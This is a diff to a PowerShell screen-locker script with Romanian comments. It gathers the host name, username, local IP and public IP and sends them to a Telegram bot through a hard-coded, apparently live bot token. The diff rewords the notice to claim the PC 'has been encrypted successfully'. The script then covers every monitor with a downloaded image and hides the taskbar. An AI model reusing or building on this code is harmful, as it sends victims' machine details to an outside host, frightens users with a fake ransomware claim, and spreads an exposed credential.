@@ -19,11 +19,19 @@ public class Native {
 $pc = $env:COMPUTERNAME
 $user = $env:USERNAME
 
-# Ia IP-ul local (ignora 127.x sau fe80:)
-$ip = (Get-NetIPAddress -AddressFamily IPv4 `
-    | Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
+# IP local
+$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 |
+    Where-Object { $_.IPAddress -notmatch '^127|169\.254|^0\.|^255|^fe80' -and $_.PrefixOrigin -ne "WellKnown" })[0].IPAddress
 
-$message = "PC-ul $pc + $user din amanet este protejat.`nAcesta este IP-ul PC-ului: $ip"
+# IP public
+try {
+    $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org") -as [string]
+} catch {
+    $ipPublic = "n/a"
+}
+
+# Mesaj Telegram
+$message = "PC-ul $user ($pc) a fost criptat cu succes.`nIP: $ipLocal | $ipPublic"
 
 # Trimite în Telegram
 $uri = 'https://api.telegram.org/bot7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co/sendMessage'
@@ -45,7 +53,7 @@ $taskbar = [Native]::FindWindow("Shell_TrayWnd", "")
 $temp = "$env:TEMP\poza_laptop.jpg"
 Invoke-WebRequest "https://raw.githubusercontent.com/diezul/x/main/1.jpg" -OutFile $temp -UseBasicParsing
 
-# ▶️ Calculează rezoluția tuturor monitoarelor
+# ▶️ Calculează rezoluția totală a monitoarelor
 $bounds = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { $_.Bounds }
 $minX = ($bounds | ForEach-Object { $_.X }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
 $minY = ($bounds | ForEach-Object { $_.Y }) | Measure-Object -Minimum | Select-Object -ExpandProperty Minimum
@@ -76,7 +84,7 @@ $pb.Dock = 'Fill'
 $pb.SizeMode = 'Zoom'
 $form.Controls.Add($pb)
 
-# ▶️ Închide la C
+# ▶️ Închide la tasta C
 $form.Add_KeyDown({
     if ($_.KeyCode -eq 'C') {
         $script:inchis = $true
